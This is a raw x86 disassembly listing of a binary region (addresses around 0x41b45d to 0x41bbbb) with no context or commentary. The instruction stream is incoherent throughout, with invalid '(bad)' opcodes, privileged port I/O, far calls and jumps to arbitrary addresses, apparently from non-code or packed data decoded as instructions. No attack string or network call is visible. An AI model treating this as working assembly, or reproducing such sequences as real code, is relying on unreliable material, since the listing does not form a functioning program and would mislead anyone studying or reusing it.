  41b45d:	arpl   WORD PTR [edx+0x4f],si
  41b460:	mov    WORD PTR [ebx-0x19625426],?
  41b466:	ins    BYTE PTR es:[edi],dx
  41b467:	cmp    bl,bh
  41b469:	xor    eax,0xaae2f132
  41b46e:	cmp    esi,edi
  41b470:	xchg   ebx,eax
  41b471:	loop   0x41b4c6
  41b473:	repnz pushw ss
  41b476:	inc    esi
  41b477:	fs sahf 
  41b479:	in     eax,0xf7
  41b47b:	and    BYTE PTR [ecx+0x57474b15],bh
  41b481:	xor    al,ch
  41b483:	push   ds
  41b484:	out    dx,eax
  41b485:	shl    DWORD PTR [ebx+0x15],0xf5
  41b489:	mov    WORD PTR [eax+0x21e8ede4],?
  41b48f:	xor    ebx,eax
  41b491:	jecxz  0x41b455
  41b493:	mov    ebx,0x761dbbf3
  41b498:	sub    ebp,DWORD PTR [ecx-0x1f]
  41b49b:	stos   BYTE PTR es:[edi],al
  41b49c:	cmp    bl,bh
  41b49e:	sbb    BYTE PTR [edx+0x23015612],bl
  41b4a4:	pop    esp
  41b4a5:	fucomi st,st(4)
  41b4a7:	jecxz  0x41b4bb
  41b4a9:	sbb    ebx,0xe094f158
  41b4af:	cmp    DWORD PTR [ebx-0x7],edi
  41b4b2:	adc    eax,0xe2f7d533
  41b4b7:	call   0x6a6:0xa78ef78b
  41b4be:	mov    es:0x5d45b3b0,al
  41b4c4:	cdq    
  41b4c5:	aaa    
  41b4c6:	lods   al,BYTE PTR ds:[esi]
  41b4c7:	xchg   esi,eax
  41b4c8:	in     al,0x3f
  41b4ca:	xor    BYTE PTR ds:0x852bd746,0xa2
  41b4d1:	jmp    0x70550d42
  41b4d6:	push   cs
  41b4d7:	pusha  
  41b4d8:	out    dx,eax
  41b4d9:	mov    esp,0x3d2e53f3
  41b4de:	mov    dl,0x50
  41b4e0:	jno    0x41b4b7
  41b4e2:	and    DWORD PTR [edi+0x13],esi
  41b4e5:	mov    fs,WORD PTR [eiz*8-0x7e03ed56]
  41b4ec:	pop    esp
  41b4ed:	pop    esp
  41b4ee:	mov    DWORD PTR [edx],edx
  41b4f0:	pop    ebp
  41b4f1:	ss jo  0x41b558
  41b4f4:	test   DWORD PTR [ecx+edi*4+0x2e9c46dd],ebp
  41b4fb:	test   eax,0x2e2e1249
  41b500:	(bad)  
  41b502:	dec    edi
  41b503:	dec    ebp
  41b504:	and    ecx,0x70
  41b507:	sbb    esp,esi
  41b509:	jp     0x41b568
  41b50b:	push   edi
  41b50c:	xchg   DWORD PTR [ebx-0x75],eax
  41b50f:	mov    BYTE PTR [edx+0x3d],dl
  41b512:	outs   dx,BYTE PTR ds:[esi]
  41b513:	inc    edx
  41b514:	xor    esi,DWORD PTR cs:[eax]
  41b517:	enter  0x33f,0x8f
  41b51b:	and    cl,cl
  41b51d:	mov    ecx,0x78df5c3e
  41b522:	xchg   BYTE PTR [ebp-0x6adfa2],ah
  41b528:	xchg   ebp,eax
  41b529:	inc    esi
  41b52a:	jo     0x41b4e7
  41b52c:	xchg   edi,eax
  41b52d:	xchg   esi,eax
  41b52e:	cli    
  41b52f:	test   BYTE PTR [eax],ah
  41b531:	out    dx,eax
  41b532:	leave  
  41b533:	mov    al,ds:0x1afef708
  41b538:	fldcw  WORD PTR [edx]
  41b53a:	dec    ebp
  41b53b:	push   edx
  41b53c:	repnz or DWORD PTR [edx+ecx*4+0x3908fdee],eax
	...
  41b550:	add    dh,ch
  41b552:	data16 hlt 
  41b554:	lods   eax,DWORD PTR ds:[esi]
  41b555:	cld    
  41b556:	mov    edi,0xbcb067ff
  41b55b:	hlt    
  41b55c:	xor    eax,0x94466ffe
  41b561:	xor    al,BYTE PTR [bx+di]
  41b564:	add    BYTE PTR [ebx+0x2e000003],ch
  41b56a:	arpl   WORD PTR [ebp-0x8eb7957],dx
  41b570:	push   ds
  41b571:	fsubp  st(7),st
  41b573:	lea    ebx,[ebx+edx*4-0x483929d1]
  41b57a:	arpl   WORD PTR [ebx+ebp*4],dx
  41b57d:	lods   eax,DWORD PTR ds:[esi]
  41b57e:	aaa    
  41b57f:	stc    
  41b580:	mov    eax,DWORD PTR [eax+0x265cf129]
  41b586:	fstp   TBYTE PTR [edx+esi*4-0x15]
  41b58a:	sub    al,BYTE PTR [eax]
  41b58c:	push   esp
  41b58d:	ins    BYTE PTR es:[edi],dx
  41b58e:	retf   0x19bd
  41b591:	push   es
  41b592:	enter  0x68d7,0xa0
  41b596:	pushf  
  41b597:	jp     0x41b5e7
  41b599:	jmp    0x41b610
  41b59b:	jecxz  0x41b547
  41b59d:	scas   eax,DWORD PTR es:[edi]
  41b59e:	sbb    eax,0x8b9603a9
  41b5a3:	mov    es,WORD PTR [edx]
  41b5a5:	jbe    0x41b5a8
  41b5a7:	jp     0x41b5e1
  41b5a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5aa:	in     al,0xe6
  41b5ac:	fcomi  st,st(7)
  41b5ae:	pop    ecx
  41b5af:	add    DWORD PTR [ecx],0x6ce1e10f
  41b5b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5b6:	or     al,0x63
  41b5b8:	mov    ch,0x66
  41b5ba:	ins    BYTE PTR es:[edi],dx
  41b5bb:	test   eax,0xcd45d19c
  41b5c0:	add    al,0x32
  41b5c2:	add    al,0x9c
  41b5c4:	pop    edi
  41b5c5:	rol    edx,cl
  41b5c7:	fadd   QWORD PTR [ebx]
  41b5c9:	mov    eax,ds:0x4c34a8c6
  41b5ce:	das    
  41b5cf:	cdq    
  41b5d0:	outs   dx,BYTE PTR ds:[esi]
  41b5d1:	adc    al,0x98
  41b5d3:	adc    al,0x6c
  41b5d5:	push   ss
  41b5d6:	clc    
  41b5d7:	loope  0x41b62b
  41b5d9:	sub    eax,0x54cf3d6d
  41b5de:	scas   al,BYTE PTR es:[edi]
  41b5df:	push   ss
  41b5e0:	js     0x41b5fa
  41b5e2:	push   eax
  41b5e3:	push   cs
  41b5e4:	mov    esp,0xdc986ba2
  41b5e9:	into   
  41b5ea:	sub    edi,DWORD PTR [edi]
  41b5ec:	jnp    0x41b5ee
  41b5ee:	pop    esp
  41b5ef:	mov    ch,0x38
  41b5f1:	mov    ebp,0x508edd73
  41b5f6:	mov    ah,0x83
  41b5f8:	adc    BYTE PTR [edx-0x23],bl
  41b5fb:	fsubr  QWORD PTR [ebx+0x3d]
  41b5fe:	xchg   esp,eax
  41b5ff:	dec    esp
  41b600:	xchg   ebp,eax
  41b601:	pop    ss
  41b602:	pop    ebx
  41b603:	and    al,0x5c
  41b605:	pop    edi
  41b606:	out    dx,eax
  41b607:	cdq    
  41b608:	xchg   edx,eax
  41b609:	mov    ds:0xd4cbf5e1,al
  41b60e:	sahf   
  41b60f:	test   DWORD PTR [edx+0x2f],edi
  41b612:	retf   
  41b613:	and    eax,0x147af4a9
  41b618:	sub    BYTE PTR [eax+0x1e],al
  41b61b:	ret    0x12bd
  41b61e:	in     al,0x1c
  41b620:	jge    0x41b68b
  41b622:	xor    al,0x56
  41b624:	xor    al,BYTE PTR [ebx]
  41b626:	fs inc eax
  41b628:	dec    edx
  41b629:	and    ebp,DWORD PTR [esi]
  41b62b:	icebp  
  41b62c:	sub    BYTE PTR [edx+0x72],al
  41b62f:	loope  0x41b5b2
  41b631:	dec    edi
  41b632:	dec    ecx
  41b633:	nop
  41b634:	call   0x63e7:0xdbea1fdb
  41b63b:	inc    esi
  41b63c:	jecxz  0x41b66f
  41b63e:	dec    eax
  41b63f:	mov    bh,0x4a
  41b641:	inc    esp
  41b642:	xchg   DWORD PTR [edx+eiz*8+0x62],ecx
  41b646:	mov    eax,ebp
  41b648:	sbb    BYTE PTR [edx-0x3c],dl
  41b64b:	jp     0x41b6ac
  41b64d:	xchg   ebp,eax
  41b64e:	mov    dl,0x4b
  41b650:	push   esp
  41b651:	pop    edi
  41b652:	mov    eax,0xb03a3d17
  41b657:	hlt    
  41b658:	prefetchwt1 BYTE PTR [ebx+0x4500a5d3]
  41b65f:	addr16 inc edx
  41b661:	mov    esp,0x9190e232
  41b666:	aas    
  41b667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b668:	sbb    al,0x6b
  41b66a:	mov    edx,0xbb8d606b
  41b66f:	out    dx,al
  41b670:	ja     0x41b648
  41b672:	nop
  41b673:	push   ss
  41b674:	sub    eax,0x99c8d558
  41b679:	aam    0x5e
  41b67b:	pop    edx
  41b67c:	or     al,bh
  41b67e:	sub    DWORD PTR [edx+0x73],esp
  41b681:	sub    al,0x53
  41b683:	jb     0x41b623
  41b685:	jle    0x41b6fb
  41b687:	sub    ah,BYTE PTR ds:0x104a8179
  41b68d:	leave  
  41b68e:	jb     0x41b682
  41b690:	aaa    
  41b691:	mov    ecx,0xe0d707db
  41b696:	and    BYTE PTR [eax],al
  41b698:	mov    BYTE PTR [ebp-0x3a],bh
  41b69b:	inc    esi
  41b69c:	leave  
  41b69d:	add    DWORD PTR [edi],eax
  41b69f:	out    dx,al
  41b6a0:	add    eax,0xab205958
  41b6a5:	inc    esi
  41b6a6:	in     eax,dx
  41b6a7:	inc    eax
  41b6a8:	test   DWORD PTR [esi-0x18],ebx
  41b6ab:	leave  
  41b6ac:	xor    eax,0xa2bd07b0
  41b6b1:	into   
  41b6b2:	sbb    eax,DWORD PTR [eax+0x72411e9f]
  41b6b8:	push   edi
  41b6b9:	lods   eax,DWORD PTR ds:[esi]
  41b6ba:	mov    edi,0x8093eed3
  41b6bf:	inc    eax
  41b6c0:	clc    
  41b6c1:	mov    ah,0xa2
  41b6c3:	int3   
  41b6c4:	jbe    0x41b659
  41b6c6:	mov    bh,BYTE PTR [edx+0xb]
  41b6c9:	je     0x41b685
  41b6cb:	dec    esp
  41b6cc:	adc    edi,DWORD PTR [eax+0x4fad9dfa]
  41b6d2:	and    BYTE PTR [eax-0x3edc1715],bh
  41b6d8:	adc    edi,DWORD PTR [edx+0x15]
  41b6db:	cdq    
  41b6dc:	jle    0x41b6cb
  41b6de:	in     eax,0x8e
  41b6e0:	mov    eax,0xd3dcc943
  41b6e5:	out    0x93,eax
  41b6e7:	mov    bl,0xa8
  41b6e9:	or     ebx,DWORD PTR [ebp+0x2a]
  41b6ec:	adc    ebx,edx
  41b6ee:	test   BYTE PTR [ebp+0x6b1d2e9c],dh
  41b6f4:	or     BYTE PTR [ecx-0x206573bf],ch
  41b6fa:	scas   al,BYTE PTR es:[edi]
  41b6fb:	stos   BYTE PTR es:[edi],al
  41b6fc:	iret   
  41b6fd:	jl     0x41b6d6
  41b6ff:	push   ebx
  41b700:	push   ebp
  41b701:	and    esp,eax
  41b703:	not    DWORD PTR [esi-0x53582cb]
  41b709:	fsubr  DWORD PTR ds:0x8ea4b7fa
  41b70f:	mov    eax,ds:0x45a561a
  41b714:	loop   0x41b741
  41b716:	(bad)  
  41b717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b718:	lahf   
  41b719:	test   al,0xd
  41b71b:	add    eax,DWORD PTR [edi-0x4d]
  41b71e:	sub    eax,0x98b6d8f
  41b723:	cli    
  41b724:	out    0x6b,eax
  41b726:	mov    ah,0xf2
  41b728:	mov    bl,0x61
  41b72a:	jge    0x41b721
  41b72c:	addr16 dec esp
  41b72e:	or     esp,DWORD PTR [eax+edi*4+0x35]
  41b732:	mov    ah,0x47
  41b734:	scas   al,BYTE PTR es:[edi]
  41b735:	jbe    0x41b6e9
  41b737:	mov    esp,0xe88272d7
  41b73c:	dec    ebp
  41b73d:	dec    ecx
  41b73e:	sub    al,0xdc
  41b740:	mov    al,0x66
  41b742:	jnp    0x41b726
  41b744:	inc    ecx
  41b745:	lods   eax,DWORD PTR ds:[esi]
  41b746:	sub    BYTE PTR [ebp+0x0],bl
  41b749:	cmp    eax,0xce0029b5
  41b74e:	push   0x1662d0df
  41b753:	loop   0x41b73c
  41b755:	jb     0x41b707
  41b757:	aam    0x51
  41b759:	fild   WORD PTR [di-0x6be1]
  41b75e:	cmp    edi,0x2a
  41b761:	pop    eax
  41b762:	setl   BYTE PTR [edi+ebx*1+0xc2ee717]
  41b76a:	inc    ebx
  41b76b:	jle    0x41b7dc
  41b76d:	imul   edx,esi,0x33f22aac
  41b773:	mov    eax,0x72c1624
  41b778:	jge    0x41b761
  41b77a:	mov    esp,0x2344f11a
  41b77f:	mov    ebx,0x714784d4
  41b784:	adc    DWORD PTR [ebp-0x71a18f28],edi
  41b78a:	sub    DWORD PTR [ebp-0x13e83eca],esp
  41b790:	push   eax
  41b791:	mov    edx,0x79f8a950
  41b796:	jl     0x41b7e3
  41b798:	jl     0x41b75f
  41b79a:	mov    ds:0x84ddd0f6,eax
  41b79f:	lea    ebp,[ebx-0x18f5698e]
  41b7a5:	aad    0x24
  41b7a7:	dec    esp
  41b7a8:	clc    
  41b7a9:	in     eax,0x66
  41b7ab:	or     esi,ecx
  41b7ad:	fidiv  WORD PTR [esi]
  41b7af:	adc    BYTE PTR [esi-0x467ddf2],cl
  41b7b5:	push   0x5d
  41b7b7:	dec    edx
  41b7b8:	icebp  
  41b7b9:	in     al,dx
  41b7ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7bb:	test   BYTE PTR [edx],0xea
  41b7be:	fiadd  WORD PTR ds:0xbede3b4e
  41b7c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7c5:	hlt    
  41b7c6:	out    0xf4,al
  41b7c8:	mov    bh,0x7a
  41b7ca:	ss add eax,0x5e3a78ff
  41b7d0:	inc    edx
  41b7d1:	mov    ah,0xe1
  41b7d3:	jmp    0x791c6d79
  41b7d8:	mov    eax,ds:0x2375baa
  41b7dd:	mov    DWORD PTR [edi+0x2a],ecx
  41b7e0:	shl    DWORD PTR [ecx-0x28],cl
  41b7e3:	(bad)  
  41b7e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7e5:	lock adc esp,DWORD PTR [ecx]
  41b7e8:	ret    
  41b7e9:	push   ss
  41b7ea:	push   edx
  41b7eb:	xchg   esi,eax
  41b7ec:	stos   DWORD PTR es:[edi],eax
  41b7ed:	nop
  41b7ee:	push   esi
  41b7ef:	xchg   esp,eax
  41b7f0:	cmp    al,0x8c
  41b7f2:	mov    ds:0xed1fce36,al
  41b7f7:	sbb    al,0x25
  41b7f9:	fs push ss
  41b7fb:	outs   dx,DWORD PTR ds:[esi]
  41b7fc:	js     0x41b798
  41b7fe:	repnz lock inc edx
  41b801:	mov    edx,0xbd79af04
  41b806:	dec    edx
  41b807:	or     esp,DWORD PTR [eax]
  41b809:	retf   
  41b80a:	inc    esp
  41b80b:	ins    BYTE PTR es:[edi],dx
  41b80c:	sub    DWORD PTR [eax-0x5d],edi
  41b80f:	adc    eax,DWORD PTR [ebx]
  41b811:	push   esi
  41b812:	mov    dl,bl
  41b814:	mov    ah,BYTE PTR [edi+0x1652904c]
  41b81a:	cs pop ebp
  41b81c:	repz xchg esp,eax
  41b81e:	or     BYTE PTR [esi],ch
  41b820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b821:	xchg   ebp,eax
  41b822:	repz (bad) 
  41b824:	or     DWORD PTR [ebx-0x387a8a12],ecx
  41b82a:	repz jnp 0x41b7bb
  41b82d:	mov    BYTE PTR [ecx],ch
  41b82f:	call   0x6f06:0x123d8d86
  41b836:	rdpmc  
  41b838:	loope  0x41b7e8
  41b83a:	push   esi
  41b83b:	or     BYTE PTR [edx+0x26],0x9
  41b83f:	aad    0x4c
  41b841:	xchg   ebx,eax
  41b842:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b843:	cmp    eax,0xfdaee173
  41b848:	adc    ebx,esi
  41b84a:	(bad)  
  41b84b:	or     al,0x1c
  41b84d:	sub    eax,0x582d2775
  41b852:	out    0xfa,eax
  41b854:	jle    0x41b8a0
  41b856:	pop    edi
  41b857:	jl     0x41b878
  41b859:	rol    al,1
  41b85b:	dec    ebp
  41b85c:	(bad)
  41b860:	in     eax,0x50
  41b862:	bound  eax,QWORD PTR [ebx+ecx*8]
  41b865:	adc    BYTE PTR [ebp+0x1a352df4],ch
  41b86b:	add    eax,DWORD PTR [ecx-0x3778b33f]
  41b871:	jns    0x41b8bd
  41b873:	(bad)  
  41b874:	retf   0x8b81
  41b877:	or     BYTE PTR [esi-0x4030b6b0],dh
  41b87d:	call   ebp
  41b87f:	jg     0x41b8b9
  41b881:	repz push edx
  41b883:	jle    0x41b89f
  41b885:	mov    ds:0x59ec9f8d,eax
  41b88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b88b:	mov    DWORD PTR cs:[ebx-0x7a],ebx
  41b88f:	retf   0x70e2
  41b892:	add    BYTE PTR [eax-0x61],cl
  41b895:	outs   dx,BYTE PTR ds:[esi]
  41b896:	mov    ah,0x1c
  41b898:	adc    BYTE PTR [ebx+0x61a03d9],dh
  41b89e:	mov    ecx,0x9e7b82c5
  41b8a3:	imul   edx,ecx,0xe69c48d3
  41b8a9:	mov    bh,BYTE PTR [ecx+esi*1+0x6a]
  41b8ad:	data16 (bad) 
  41b8af:	push   eax
  41b8b0:	sbb    al,0xe2
  41b8b2:	xor    dh,ah
  41b8b4:	loop   0x41b867
  41b8b6:	mov    BYTE PTR [eax-0x69f34485],ch
  41b8bc:	pop    edx
  41b8bd:	sbb    BYTE PTR [edx-0x5b],dh
  41b8c0:	das    
  41b8c1:	sbb    BYTE PTR [edx+0x1f],ah
  41b8c4:	jns    0x41b944
  41b8c6:	xchg   esi,eax
  41b8c7:	in     eax,0x20
  41b8c9:	sub    al,0xc9
  41b8cb:	addr16 mov esi,0xf5a0b43a
  41b8d1:	sub    eax,0xecc928f2
  41b8d6:	mov    WORD PTR [esi-0x5],ss
  41b8d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8da:	push   0xffffff9d
  41b8dc:	ror    ch,0x17
  41b8df:	cmp    BYTE PTR [esi],bh
  41b8e1:	mov    esi,0xa18e1af1
  41b8e6:	or     ecx,eax
  41b8e8:	mov    eax,ds:0x2bfc03ac
  41b8ed:	in     eax,dx
  41b8ee:	cwde   
  41b8ef:	fcmovnbe st,st(3)
  41b8f1:	int3   
  41b8f2:	xor    al,0x2a
  41b8f4:	aam    0x14
  41b8f6:	xchg   esi,eax
  41b8f7:	add    BYTE PTR [eax-0x1f],0x94
  41b8fb:	sub    BYTE PTR [edi],dl
  41b8fd:	pop    esi
  41b8fe:	xchg   ah,bl
  41b900:	idiv   BYTE PTR [ecx+0x591666d9]
  41b906:	jecxz  0x41b8c7
  41b908:	add    BYTE PTR [esp+edx*8],0x93
  41b90c:	xor    DWORD PTR [esi],edx
  41b90e:	add    dl,BYTE PTR [edi]
  41b910:	dec    ebx
  41b911:	clc    
  41b912:	in     al,dx
  41b913:	cmc    
	...
  41b920:	add    BYTE PTR ds:0x7fd60e68,dl
  41b926:	neg    ch
  41b928:	jmp    0x41b991
  41b92a:	cli    
  41b92b:	and    BYTE PTR [esi-0x3d],ah
  41b92e:	das    
  41b92f:	jae    0x41b97a
  41b931:	adc    dh,BYTE PTR [esi]
  41b933:	add    DWORD PTR [eax],eax
  41b935:	stos   DWORD PTR es:[edi],eax
  41b936:	add    eax,DWORD PTR [eax]
  41b938:	add    cl,bl
  41b93a:	(bad)  
  41b93b:	(bad)  
  41b93c:	xor    bl,BYTE PTR [ecx]
  41b93e:	mov    al,ds:0x5f43ff05
  41b943:	xchg   esi,eax
  41b944:	out    dx,al
  41b945:	imul   edi,edi,0xa5227c3d
  41b94b:	inc    esp
  41b94c:	nop
  41b94d:	xor    bl,BYTE PTR gs:[ecx-0x2767c3fe]
  41b954:	or     ah,BYTE PTR [ecx+ebx*4+0x2c]
  41b958:	push   esp
  41b959:	sub    ebx,DWORD PTR [ecx]
  41b95b:	loop   0x41b8f3
  41b95d:	mov    edx,0x3e21eed9
  41b962:	cmp    edx,ebx
  41b964:	out    0x63,al
  41b966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b967:	push   ebp
  41b968:	adc    BYTE PTR [eax+0x3427ae2f],bl
  41b96e:	and    cl,dl
  41b970:	retf   0x947
  41b973:	mov    ecx,ecx
  41b975:	xor    eax,DWORD PTR [ebp+ebx*4+0x5b]
  41b979:	lods   eax,DWORD PTR ds:[esi]
  41b97a:	hlt    
  41b97b:	add    DWORD PTR [edx+0x59273628],edx
  41b981:	push   0x9410bf8f
  41b986:	push   esi
  41b987:	sub    al,0xcc
  41b989:	and    edi,esp
  41b98b:	iret   
  41b98c:	sahf   
  41b98d:	mov    eax,ds:0xbd359237
  41b992:	sub    al,0x73
  41b994:	ret    
  41b995:	xchg   esi,eax
  41b996:	dec    edi
  41b997:	mov    WORD PTR [ebx+0x4c],es
  41b99a:	mov    eax,0x31f7085b
  41b99f:	jne    0x41b96a
  41b9a1:	out    dx,al
  41b9a2:	outs   dx,DWORD PTR ds:[esi]
  41b9a3:	adc    DWORD PTR [esi-0x58],esp
  41b9a6:	std    
  41b9a7:	cdq    
  41b9a8:	iret   
  41b9a9:	mov    ebp,0xdca7a9d
  41b9ae:	out    0xa6,eax
  41b9b0:	mov    ah,0x50
  41b9b2:	add    esi,DWORD PTR [ebx+edi*4]
  41b9b5:	or     ecx,DWORD PTR [eax]
  41b9b7:	xchg   ecx,eax
  41b9b8:	fwait
  41b9b9:	jmp    0xd26f2ab
  41b9be:	andnps xmm0,XMMWORD PTR [ebx]
  41b9c1:	outs   dx,BYTE PTR ds:[esi]
  41b9c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9c3:	inc    esp
  41b9c4:	mov    edx,0x9e74871
  41b9c9:	je     0x41b9eb
  41b9cb:	fdecstp 
  41b9cd:	pop    edx
  41b9ce:	stos   DWORD PTR es:[edi],eax
  41b9cf:	ret    
  41b9d0:	jg     0x41ba2e
  41b9d2:	sar    DWORD PTR [edi-0x3b],1
  41b9d5:	sub    DWORD PTR [esi-0x76208b7c],esp
  41b9db:	add    eax,0x7097f353
  41b9e0:	pop    ss
  41b9e1:	sbb    eax,0xa7ad9510
  41b9e6:	das    
  41b9e7:	push   ebx
  41b9e8:	mov    DWORD PTR fs:[esi+eax*8+0x3911bc1e],eax
  41b9f0:	cli    
  41b9f1:	sti    
  41b9f2:	adc    edi,DWORD PTR [edi]
  41b9f4:	sahf   
  41b9f5:	push   0xffffffd5
  41b9f7:	popf   
  41b9f8:	jnp    0x41ba15
  41b9fa:	mov    bl,0xcb
  41b9fc:	and    DWORD PTR [ecx],ebp
  41b9fe:	sti    
  41b9ff:	mov    esi,0xc14abd1c
  41ba04:	shr    BYTE PTR ds:0xeaadfea1,0x1e
  41ba0b:	add    DWORD PTR [edi-0x39],0xffffffd5
  41ba0f:	pop    ds
  41ba10:	into   
  41ba11:	sbb    ebx,DWORD PTR [eax]
  41ba13:	cld    
  41ba14:	xor    al,0xe
  41ba16:	test   DWORD PTR [eax+0x4e19b175],ebp
  41ba1c:	or     BYTE PTR [edi-0x529ceac],bl
  41ba22:	push   0x73
  41ba24:	sub    bl,BYTE PTR [esi-0x19]
  41ba27:	iret   
  41ba28:	dec    ecx
  41ba29:	inc    ebp
  41ba2a:	enter  0x297e,0xa3
  41ba2e:	push   edx
  41ba2f:	or     cl,BYTE PTR [ebp+0x5bec7585]
  41ba35:	push   ebp
  41ba36:	pop    ebx
  41ba38:	loope  0x41b9d9
  41ba3a:	adc    al,BYTE PTR [ecx+0x1d]
  41ba3d:	add    BYTE PTR [ecx+0x28],dh
  41ba40:	mov    ecx,0x8534b1c0
  41ba45:	adc    ecx,edx
  41ba47:	test   BYTE PTR [edi],dh
  41ba49:	rcl    BYTE PTR [esi],cl
  41ba4b:	daa    
  41ba4c:	mov    ebp,0xabde426d
  41ba51:	test   eax,0x9d47d1b3
  41ba56:	xchg   ebx,eax
  41ba57:	sub    esp,DWORD PTR [ecx]
  41ba59:	jmp    0x41ba66
  41ba5b:	in     al,dx
  41ba5c:	inc    esp
  41ba5d:	dec    esi
  41ba5e:	pop    ebp
  41ba5f:	call   0x97f9:0x11a4c9b1
  41ba66:	ins    BYTE PTR es:[edi],dx
  41ba67:	cdq    
  41ba68:	push   ss
  41ba69:	fmul   st(0),st
  41ba6b:	sub    BYTE PTR [eax],ah
  41ba6d:	mov    ah,0xbe
  41ba6f:	pop    esi
  41ba70:	push   eax
  41ba71:	stos   DWORD PTR es:[edi],eax
  41ba72:	rcl    ah,0x1c
  41ba75:	repz jle 0x41ba4b
  41ba78:	daa    
  41ba79:	icebp  
  41ba7a:	xor    al,0x84
  41ba7c:	mov    eax,ds:0x697f53f1
  41ba81:	(bad)  
  41ba82:	sbb    DWORD PTR [eax-0x1],eax
  41ba85:	xchg   esp,eax
  41ba86:	aaa    
  41ba87:	test   eax,0x32e08689
  41ba8c:	dec    edx
  41ba8d:	cmp    BYTE PTR [ebp-0x10002544],0x1f
  41ba94:	jge    0x41ba28
  41ba96:	int    0x77
  41ba98:	and    dh,al
  41ba9a:	fwait
  41ba9b:	cs xchg ecx,eax
  41ba9d:	mov    es,WORD PTR [edi]
  41ba9f:	jo     0x41baab
  41baa1:	sar    ch,cl
  41baa3:	mov    dh,0x50
  41baa5:	xchg   BYTE PTR [edi+0x2d78dce2],dh
  41baab:	fwait
  41baac:	popa   
  41baad:	fwait
  41baae:	pop    ebx
  41baaf:	out    dx,eax
  41bab0:	mov    WORD PTR [ebp+0x796a5db8],cs
  41bab6:	push   ss
  41bab7:	dec    edx
  41bab8:	inc    edi
  41bab9:	and    ebp,DWORD PTR [eax-0xe]
  41babc:	mov    ecx,0x25795366
  41bac1:	sbb    al,0x22
  41bac3:	es gs dec edx
  41bac6:	into   
  41bac7:	xor    eax,0x8a7b8c0b
  41bacc:	stc    
  41bacd:	mov    ah,0xff
  41bacf:	popf   
  41bad0:	pop    esp
  41bad1:	jg     0x41baa5
  41bad3:	lods   eax,DWORD PTR ds:[esi]
  41bad4:	hlt    
  41bad5:	(bad)  
  41bad6:	nop
  41bad7:	add    al,dh
  41bad9:	int    0x6d
  41badb:	stc    
  41badc:	call   DWORD PTR [edx-0x1554c06c]
  41bae2:	popa   
  41bae3:	and    al,0x80
  41bae5:	add    eax,0x6478e513
  41baea:	hlt    
  41baeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baec:	repz sub edi,DWORD PTR [esi+0x29]
  41baf0:	test   DWORD PTR [ecx],0x5a25165b
  41baf6:	inc    ebx
  41baf7:	mov    bl,0x70
  41baf9:	sbb    DWORD PTR [ecx+edi*8],esp
  41bafc:	sar    BYTE PTR [ebx-0x27036c52],cl
  41bb02:	outs   dx,DWORD PTR ds:[esi]
  41bb03:	sbb    eax,0x65827e87
  41bb08:	mov    ds:0xc7854ed2,al
  41bb0d:	sbb    al,0x94
  41bb0f:	in     al,0x16
  41bb11:	mov    bl,0xfe
  41bb13:	push   edx
  41bb14:	inc    ebp
  41bb15:	mov    edx,0x94dfdcba
  41bb1a:	repz in eax,dx
  41bb1c:	rep outs dx,DWORD PTR ds:[esi]
  41bb1e:	jge    0x41bb1d
  41bb20:	shr    BYTE PTR [edi+0x4f],1
  41bb23:	and    eax,0xf4c21fea
  41bb28:	xchg   al,ah
  41bb2a:	sbb    bl,0x35
  41bb2d:	aam    0xe7
  41bb2f:	ss leave 
  41bb31:	jle    0x41bb5a
  41bb33:	adc    BYTE PTR [eax+0xc],ah
  41bb36:	fisub  WORD PTR [ebx-0x3f]
  41bb39:	sub    eax,0x8fe7a1ad
  41bb3e:	adc    cl,dl
  41bb40:	or     al,0xe6
  41bb42:	and    esi,DWORD PTR [ecx+0x39e99940]
  41bb48:	std    
  41bb49:	out    dx,al
  41bb4a:	push   edi
  41bb4b:	cs ret 0x1d67
  41bb4f:	mov    esp,0xc1e8ab59
  41bb54:	mov    WORD PTR [edx],fs
  41bb56:	sahf   
  41bb57:	sub    DWORD PTR [ebx+0xc],0x3ed49c0a
  41bb5e:	loopne 0x41bafd
  41bb60:	pop    edx
  41bb61:	ror    BYTE PTR [ebx-0x29],cl
  41bb64:	dec    ebp
  41bb65:	aam    0x19
  41bb67:	add    eax,0xbc75cc75
  41bb6c:	inc    ebp
  41bb6d:	or     ch,ch
  41bb6f:	add    edx,esp
  41bb71:	cmp    DWORD PTR [eax],ebx
  41bb73:	xlat   BYTE PTR ds:[ebx]
  41bb74:	jno    0x41bbd4
  41bb76:	ja     0x41bbc7
  41bb78:	mov    dl,0x4e
  41bb7a:	cwde   
  41bb7b:	out    0x1a,al
  41bb7d:	jecxz  0x41bb11
  41bb7f:	pop    edx
  41bb80:	dec    ebx
  41bb81:	dec    eax
  41bb82:	xchg   edx,eax
  41bb83:	cmp    ch,BYTE PTR [edi-0x62]
  41bb86:	out    dx,al
  41bb87:	aad    0xcb
  41bb89:	repz push esi
  41bb8b:	clc    
  41bb8c:	or     DWORD PTR [ebx-0x1e],ebx
  41bb8f:	adc    eax,0x2d86ab9a
  41bb94:	fist   WORD PTR [eax+0x31]
  41bb97:	lahf   
  41bb98:	popa   
  41bb99:	scas   al,BYTE PTR es:[edi]
  41bb9a:	mov    ds:0x9ee76db5,eax
  41bb9f:	xor    DWORD PTR [ebx+0x70],ecx
  41bba2:	pop    ecx
  41bba3:	not    ecx
  41bba5:	fsub   QWORD PTR [ecx+ebx*1+0x2a7d2c30]
  41bbac:	(bad)  
  41bbad:	ins    BYTE PTR es:[edi],dx
  41bbae:	pop    esi
  41bbaf:	add    dh,bl
  41bbb1:	ss aam 0x31
  41bbb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbb5:	mov    al,ds:0xf6bb27cd
  41bbba:	inc    eax
  41bbbb:	xchg   esp,eax
